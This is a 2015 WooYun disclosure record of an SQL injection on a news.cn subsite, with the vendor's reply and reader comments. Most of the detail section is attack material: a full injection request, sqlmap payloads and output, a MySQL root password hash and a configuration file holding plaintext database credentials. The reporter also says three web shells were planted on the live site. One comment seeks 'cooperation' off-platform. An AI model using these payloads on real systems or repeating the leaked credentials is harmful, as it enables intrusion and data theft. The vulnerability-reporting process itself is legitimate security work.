{"id": 72613, "wybug_id": "wooyun-2015-0156410", "wybug_title": "新华网分站注入漏洞已获取Shell", "wybug_corp": "news.cn", "wybug_author": "路人甲", "wybug_date": "2015-11-27 20:54", "wybug_open_date": "2016-01-15 17:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-15：\t细节向公众公开  简要描述： 新华网某分站存在SQL注入漏洞(可直接注入写SHELL) 详细说明：  POST /index.php?a=search&m=Book HTTP/1.1Content-Length: 325Content-Type: application/x-www-form-urlencodedCookie: PHPSESSID=3pch5cs1cv48ma4f6seeh8oac5; Hm_lvt_5089967f7e1498f369403735f0ee097a=1448597591,1448597651,1448597738,1448597771; Hm_lpvt_5089967f7e1498f369403735f0ee097a=1448597771; HMACCOUNT=DAE66A74F1B9E64BHost: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*key='and(select%201%20from(select%20count(*)%2cconcat((select%20concat(CHAR(52)%2cCHAR(67)%2cCHAR(117)%2cCHAR(52)%2cCHAR(75)%2cCHAR(81)%2cCHAR(55)%2cCHAR(83)%2cCHAR(109)%2cCHAR(118)%2cCHAR(52))%20from%20information_schema.tables%20limit%200%2c1)%2cfloor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)and'   漏洞证明：  sqlmap resumed the following injection point(s) from stored session:---Parameter: key (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: key=1%' AND 8851=8851 AND '%'='    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: key=1%' AND (SELECT 2176 FROM(SELECT COUNT(*),CONCAT(0x7176787171,(SELECT (ELT(2176=2176,1))),0x716a6b7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind    Payload: key=1%' AND SLEEP(5) AND '%'='    Type: UNION query    Title: MySQL UNION query (NULL) - 37 columns    Payload: key=1%' UNION ALL SELECT CONCAT(0x7176787171,0x7872476242637461637a444b4b45567641506a6978564c695649784271566766484665586e424854,0x716a6b7671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#---do you want to exploit this SQL injection? [Y/n][15:36:06] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: Apache 2.2.15back-end DBMS: MySQL 5.0[*] root [1]:    password hash: *3EA0DFA79A76FDCA62C8B7D3888C4B1D19D1DFFA<?phpreturn array (  'DB_HOST' => 'localhost',  'DB_NAME' => 'weixinshop',  'DB_USER' => 'root',  'DB_PWD' => '4xe6076437',  'DB_PORT' => '3306',  'DB_PREFIX' => 'weixin_',);\n\n虚拟机不方便就这样吧   修复方案：  有三个shell  自己看时间删了 本地no32老是拦截 我还以为拿不下放弃了.后来发现shell都ok了   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-01 16:59 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向新华网上级管理单位通报,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-11-27 23:02 |    \t\tSnake~ \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 0.0)\t\t \n  大哥，是否能谈一下合作。方便留个QQ吗，我的QQ是841353199    \n     2015-11-28 01:11 |    \t\t纯情 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:2        | 站在人生的顶端，俯视生命的千姿百态。)\t\t \n  @Snake~ @Snake~ 10001    \n     2015-11-28 11:25 |    \t\tExploit DB \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 最帅的小白，刚混乌云，求大牛多多关照)\t\t \n  前排围观，此洞必火    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}